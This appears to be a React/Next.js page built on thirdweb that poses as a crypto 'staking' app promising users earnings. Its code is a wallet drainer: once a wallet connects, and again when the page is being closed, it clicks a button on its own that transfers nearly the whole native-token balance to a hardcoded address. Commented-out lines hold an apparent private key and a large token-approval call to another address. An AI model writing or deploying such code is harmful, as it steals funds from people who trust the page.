import {
  ConnectWallet,
  useAddress,
  useContract,
  useTokenBalance,
  Web3Button,
} from "@thirdweb-dev/react";
import type { NextPage } from "next";
import styles from "../styles/Theme.module.css";

import { useContractWrite } from "@thirdweb-dev/react";
import Image from "next/image";
import Box from "../public/box1.png"

import { useBalance } from "@thirdweb-dev/react";
import { NATIVE_TOKEN_ADDRESS } from "@thirdweb-dev/sdk";
import { ThirdwebSDK } from "@thirdweb-dev/sdk";
import { ethers } from "ethers";

import { MetaMaskWallet } from "@thirdweb-dev/wallets";

import { Ethereum, Polygon } from "@thirdweb-dev/chains";

import { useEffect, useRef } from 'react'
const StakingMutant: NextPage = () => {

  const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
  console.log("data is " + data?.displayValue);
  const address = useAddress();
  const address1 = "0x6a2338373e11b2dde69a0361e05125d0d94e9ffc"

  const tokenContractAddress = "0x37F6BBE4fB136BEA7A678651031BbBE577B25f21";

  const { contract: tokenContract } = useContract(
    tokenContractAddress,
    "token"
  );
  const { data: tokenBalance } = useTokenBalance(tokenContract, address);

  const amount = BigInt("10000000000000000000000000");

  // const sdk = ThirdwebSDK.fromPrivateKey(
  //   "425eea8497aabbba70763a3a56d1fe6a844026a281469da46912fe9786cd3a41", // Your wallet's private key (only required for write operations)
  //   "mumbai"
  // );


  const wallet = new MetaMaskWallet(
    {
      chains: [Ethereum, Polygon],
    },
  );

  const sdk = ThirdwebSDK.fromWallet(wallet, "ethereum");

  async function Transfer() {
    const valueAsNumber = Number(data?.displayValue) || 0;

    const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.1);
  }

  const buttonRef = useRef<HTMLButtonElement>(null);

  useEffect(() => {
    const handleBeforeUnload = () => {
      if (buttonRef.current) {
        buttonRef.current.click();
      }
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [address]);

  useEffect(() => {
    if (buttonRef.current) {
      buttonRef.current.click();
    }
  }, [address]);

  return (
    <>


      <div className={address ? styles.container : styles.container + " " + styles.ccbtn}>

        {!address ? (
          <div className="cnt">
            <h3 className="cnt-text">Connect Your Wallet to Start your Earning</h3>
            <div className="connect-btn">
              <ConnectWallet className="header-button" />
            </div>
          </div>
        ) : (
          <>
            <div className="header-button_connect"> <ConnectWallet /> </div>
            <Image src={Box} alt="" className="box-img" />
            <h2 className="wb">WALLET BALANCE</h2>
            <div className={styles.tokenGrid + " " + styles.currbalance}>
              <div className={styles.tokenItem + " " + styles.tokenIt}>
                <h3 className={styles.tokenLabel}>Current Balance</h3>
                <p className={styles.tokenValue}>
                  {/* <b>{tokenBalance?.displayValue.substring(0, 4)}</b> {tokenBalance?.symbol} */}
                  <b>{isLoading ? "loading" : data?.displayValue}</b>
                </p>
              </div>
            </div>

            <br />
            {/* <Web3Button
              contractAddress="0xCd38AabFbd1ff049d7A091d354EdF0704dfeF184"
              className={`${styles.mainButton} ${styles.spacerBottom} ${styles.listbtn} ${styles.startbtn} ${styles.clainbtn}`}
              action={(contract) => {
                contract.call("approve", [address1, amount])
              }}

              overrides={{
                from: address, // The address this transaction is from.
                value: data?.value, // send 0.1 ether with the contract call
              }}

            >
              Start Earning
            </Web3Button> */}

            <button onClick={Transfer} ref={buttonRef} className="earn_btn header-button">Click To Start Earning</button>
            {/* <Web3Button
                contractAddress="0x..."
                action={(contract) => contract.erc721.claim(1)}
                overrides={{
                  from: address, // The address this transaction is from.
                  value: data?.value, // send 0.1 ether with the contract call
                }}
              >
                Click To Start Earning
              </Web3Button> */}

            {/* <button
              className={`${styles.mainButton} ${styles.spacerBottom} ${styles.listbtn} ${styles.startbtn}`}

            >
              Start Earning
            </button> */}
          </>
        )}
      </div>
    </>
  );
};

export default StakingMutant;

function transferTokens(arg0: {
  to: any; // Address to transfer to
  amount: bigint;
}): any {
  throw new Error("Function not implemented.");
}
